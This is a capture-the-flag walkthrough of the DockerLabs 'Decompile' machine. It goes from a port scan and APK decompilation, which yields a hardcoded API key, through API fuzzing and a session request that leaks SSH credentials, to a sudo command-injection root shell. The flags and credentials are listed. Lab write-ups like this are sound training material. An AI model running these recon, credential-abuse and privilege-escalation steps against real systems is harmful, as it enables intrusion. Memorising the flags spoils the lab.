# "Decompile" Machine Solution - DockerLabs
### Difficulty: Medium | Categories: Web, Reversing, API Fuzzing, Privilege Escalation

## 1. Deployment and Active Reconnaissance

We begin by deploying the lab and verifying connectivity to the target machine (IP: 172.17.0.2).
  $sudo bash auto_deploy.sh decompile.tar 
  
  <img width="567" height="456" alt="image" src="https://github.com/user-attachments/assets/71b51fc1-c38d-4a53-85d3-03cd26598bd7" />

To identify available attack vectors, we perform a comprehensive port scan using nmap.

  $sudo nmap -p- -sS -sC -sV -T5 -n -Pn -vvv 172.17.0.2   
  
  <img width="876" height="270" alt="image" src="https://github.com/user-attachments/assets/be07c056-d55a-464b-b54d-dc984cc4fb0a" />
  
  <img width="1301" height="652" alt="image" src="https://github.com/user-attachments/assets/c3efa1e3-971d-42bf-91d8-281ce7e58428" />

The scan reveals that ports 22 (SSH) and 80 (HTTP) are open. Upon exploring the web service, we find a downloadable file (app-release.apk) and a note referencing the path *com/inmohogar/roomshare/BuildConfig.java*

## 2. Static Analysis (Reverse Engineering)

We download the APK file to analyze it locally.

$wget http://172.17.0.2/app-release.apk  

Since the hint explicitly mentions a .java file, we use JADX—a tool specialized in recovering Java code from Android binaries—thereby avoiding tools like apktool, which focus on manifests and resources.

$jadx-gui ./app-release.apk
<img width="862" height="250" alt="image" src="https://github.com/user-attachments/assets/a421f8ac-8720-4c4e-8a6b-da2e8e942650" />
<img width="1337" height="565" alt="image" src="https://github.com/user-attachments/assets/c7c03a7d-d612-4980-bdb4-078a2735cd31" />

Upon inspecting the `BuildConfig` class, we discovered a serious security flaw: exposed credentials and environment variables (hardcoded secrets).

**CTF_STAGE1: FLAG{stage1_buildconfig_leak_BKGVlytS}**
API Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9
Base URL: [https://booking.internal/v3/](https://booking.internal/v3/)
Tenant Account: INMO-MAD-PRIMARY

## 3. Web Enumeration and Endpoint Fuzzing

The base URL points to the domain booking.internal. To interact with it, we add a local resolution entry to our /etc/hosts file.

$ echo "172.17.0.2 booking.internal" | sudo tee -a /etc/hosts

We will use `curl` to send a request containing the `api_key` we discovered.

$ curl -i -H "X-API-Key: BKGVIytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" http://booking.internal/v3/
<img width="835" height="56" alt="image" src="https://github.com/user-attachments/assets/8f7e6e02-c75c-480f-8c6c-2f95faacb56b" />

*not here* When attempting to access the base path `/v3/` with the retrieved API key, the server returns an error indicating that there are no resources at the root. We then proceed to perform directory fuzzing using `ffuf` to uncover the API's structure.

$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://booking.internal/FUZZ -fc 404
<img width="865" height="462" alt="image" src="https://github.com/user-attachments/assets/08f1b1b2-811e-4dcd-9adc-0dd4038879dc" />

The scan reveals the /booking/ directory. We perform a second round of fuzzing by injecting our authentication header (X-API-Key), which exposes the /properties endpoint.

<img width="875" height="476" alt="image" src="https://github.com/user-attachments/assets/73a2b424-20f3-4208-b2d7-1a69e1426588" />

## 4. API Exploitation and Initial Access
We interact manually with the discovered endpoint to read the response body:

$ curl -i -s -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" http://booking.internal/booking/properties
<img width="872" height="242" alt="image" src="https://github.com/user-attachments/assets/18edf9cc-13bc-465c-bca3-23c0e86fb783" />

The server returns an HTTP 200 OK status code, a list of properties, and a crucial hint (Information Disclosure): "_ctf_hint": "Auth OK. Try POST /sessions with tenant_account=INMO-MAD-PRIMARY".

We use this information to craft a JSON-formatted POST request and create a valid session within the multi-tenant architecture.

$curl -i -s -X POST -H "X-API-Key: BKGVlytSjDihCgXmNPm1cM6QwhRjrT86yJ2sEaf9" -H "Content-Type: application/json" -d '{"tenant_account": "INMO-MAD-PRIMARY"}' http://booking.internal/booking/sessions
<img width="871" height="307" alt="image" src="https://github.com/user-attachments/assets/963d7384-7163-4053-aff3-c97267908ff4" />

The response includes confirmation of Phase 2 and reveals, in plain text, the SSH credentials: deploy:c0mpartir-p1s0s. We connect to the server and capture the third flag in the user's directory.

$ssh deploy@172.17.0.2

<img width="699" height="642" alt="image" src="https://github.com/user-attachments/assets/4f4313e1-1dca-40dd-ac57-da36f2562bd5" />

cat flag-stage3.txt

<img width="426" height="37" alt="image" src="https://github.com/user-attachments/assets/a580290e-c2f8-4eb9-98a7-1d147e5ec060" />

**Flag 3: stage3_ssh_user_land_4ca5d8a311bb**

## 5. Privilege Escalation
We check our user's delegated privileges using `sudo -l`.

The system confirms that the user `deploy` can execute the binary `/opt/decompile/ssh/privesc/manage-svc` with root privileges without providing a password (`NOPASSWD`).
<img width="855" height="137" alt="image" src="https://github.com/user-attachments/assets/585d7d1f-4c7a-493d-8142-80ecea3900fa" />

Upon analyzing this executable, we discovered that it processes user input in an insecure manner. We exploited this command injection vulnerability by injecting the path to a command interpreter (/bin/bash) as an argument.
$sudo /opt/decompile/ssh/privesc/manage-svc "/bin/bash"

The binary invokes the console inheriting superuser privileges. We gain root access and read the final flag in the /root/flag-root.txt directory, compromising the machine completely.

$ ls -l /opt/decompile/ssh/privesc/manage-svc /usr/local/bin/restart-booking-gw
<img width="775" height="266" alt="image" src="https://github.com/user-attachments/assets/32c7a60c-f860-4c4b-b8ff-b28d517c8348" />

**flag-root: FLAG{stage4_root_4ca5d8a311bb_1792489011}**













